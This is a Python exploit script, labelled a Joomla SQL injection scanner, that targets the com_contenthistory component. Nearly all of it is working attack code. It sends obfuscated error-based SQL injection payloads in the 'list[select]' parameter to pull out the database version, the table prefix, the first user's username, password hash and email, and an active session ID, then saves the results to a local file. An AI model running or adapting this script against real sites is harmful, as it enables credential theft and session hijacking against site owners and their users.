#!/usr/bin/python3
import sys
import re
import urllib3
from urllib.parse import urlparse, urlencode
import argparse
import certifi

# Disable warnings about insecure requests
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def format_proxy_url(proxy):
    if proxy and not proxy.startswith(('http://', 'https://')):
        return f'http://{proxy}'
    return proxy

def inject(u, proxy=None):
    tblprefix   = ''
    username    = ''
    password    = ''
    email       = ''
    session_id  = ''
    #Payload for version() and user()
    payload1    = { 'option' : 'com_contenthistory', 'view' : 'history', 'list[ordering]' : '' , 'item_id' : '', 'type_id' : '', 'list[select]' : 'polygon((/*!00000select*/*/*!00000from*/(/*!00000select*/*/*!00000from*/(/*!00000select*/concat_ws(0x7e3a,0x6d616b6d616e,version(),user())as mk)``)``))' }
    #Payload for table prefix
    payload2    = { 'option' : 'com_contenthistory', 'view' : 'history', 'list[ordering]' : '' , 'item_id' : '', 'type_id' : '', 'list[select]' : 'polygon((/*!00000select*/*/*!00000from*/(/*!00000select*/*/*!00000from*/(/*!00000select*/concat_ws(0x7e3a,0x6d616b6d616e,(/*!00000select*//*!00000table_name*//*!00000from*//*!00000information_schema*/.tables/*!00000where*/table_schema=database() and/*!00000table_name*/like 0x25636f6e74656e745f7479706573 limit 0,1))as mk)``)``))' }
    #Formating our URL properly
    o           = urlparse(u)
    url         = o.scheme + '://' + o.netloc + '/index.php'
    print(f"url {url}")
    
    # Set up the proxy if provided
    if proxy:
        formatted_proxy = format_proxy_url(proxy)
        http = urllib3.ProxyManager(formatted_proxy, cert_reqs='CERT_NONE', ca_certs=certifi.where())
    else:
        http = urllib3.PoolManager(cert_reqs='CERT_NONE', ca_certs=certifi.where())

    try:
        r = http.request('GET', url, fields=payload1, timeout=15.0)
        print("getting info")
        if b'makman~:' in r.data:
            iresult = re.search(b"makman~:(.+?)'", r.data).group(1).decode('utf-8')

            print("getting table prefix")
            r = http.request('GET', url, fields=payload2, timeout=15.0)
            if b'makman~:' in r.data:
                tresult = re.search(b"makman~:(.+?)'", r.data).group(1).decode('utf-8')
                tblprefix = tresult.replace('content_types', '')
                #get users
                print("getting users")
                payload3 = { 'option' : 'com_contenthistory', 
                'view' : 'history', 
                'list[ordering]' : '' , 
                'item_id' : '', 
                'type_id' : '', 
                'list[select]' : 'polygon((/*!00000select*/*/*!00000from*/(/*!00000select*/*/*!00000from*/(/*!00000select*/concat_ws(0x7e3a,(/*!00000select*/concat_ws(0x7e3a,0x6d616b6d616e,username,password,email) /*!00000from*/' + tblprefix + 'users order by id ASC limit 0,1),(/*!00000select*/session_id /*!00000from*/' + tblprefix + 'session order by time DESC limit 0,1))as mk)``)``))' 
                }

                r = http.request('GET', url, fields=payload3, timeout=15.0)
                if b'makman~:' in r.data:
                    fresult     = re.search(b"makman~:(.+?)'", r.data).group(1).decode('utf-8')
                    username    = fresult.split('~:')[0]
                    password    = fresult.split('~:')[1]
                    email       = fresult.split('~:')[2]
                    #session_id  = fresult.split('~:')[3]

                print("getting sessions")
                
                payload4 = { 'option' : 'com_contenthistory', 
                'view' : 'history', 
                'list[ordering]' : '' , 
                'item_id' : '', 
                'type_id' : '', 
                'list[select]' : 'polygon((/*!00000select*/*/*!00000from*/(/*!00000select*/*/*!00000from*/(/*!00000select*/concat_ws(0x7e3a,(/*!00000select*/concat_ws(0x7e3a,0x6d616b6d616e,session_id) /*!00000from*/' + tblprefix + 'session order by session_id ASC limit 0,1),(/*!00000select*/session_id /*!00000from*/' + tblprefix + 'session order by time DESC limit 0,1))as mk)``)``))' 
                }
                r = http.request('GET', url, fields=payload4, timeout=15.0)
                if b'makman~:' in r.data:
                    fresult     = re.search(b"makman~:(.+?)'", r.data).group(1).decode('utf-8')
                    session_id  = fresult.split('~:')[0]
            print('------------------------------------------------\n')
            print('[+] Url        : ' + url)
            print('[+] User       : ' + iresult.split('~:')[1])
            print('[+] Version    : ' + iresult.split('~:')[0])
            print('[+] tbl_prefix : ' + tblprefix)
            print('[+] Username   : ' + username)
            print('[+] Password   : ' + password)
            print('[+] Email      : ' + email)
            print('[+] Session Id : ' + session_id)
            print('\n------------------------------------------------\n')
            sys.stdout.flush()
            return url + '~:' + iresult + '~:' + tblprefix + '~:' + username + '~:' + password + '~:' + email + '~:' + session_id
        else:
            return url + '~:' + 'Not Vulnerable'
    except Exception as e:
        print(f"An error occurred: {e}")
        return url + '~:' + 'Bad Response'

def main():
    parser = argparse.ArgumentParser(description='Joomla SQL Injection Scanner')
    parser.add_argument('--url', type=str, required=True, help='URL to scan')
    parser.add_argument('--proxy', type=str, help='Proxy to use (e.g., 127.0.0.1:8081)')
    args = parser.parse_args()

    url = args.url
    proxy = args.proxy
    file_string = '######## By MakMan ########\n'

    print(f'[-] Starting scan for URL: {url}')
    if proxy:
        print(f'[-] Using proxy: {proxy}')

    # Running the exploit on the single URL
    result = inject(url, proxy)

    if 'Not Vulnerable' not in result and 'Bad Response' not in result:
        file_string += '\n'.join(result.split('~:')) + '\n\n\n'

    # Writing vulnerable URL in a file makman.txt
    with open('makman.txt', 'a', encoding='utf-8') as rfile:
        rfile.write(file_string)

if __name__ == "__main__":
    main()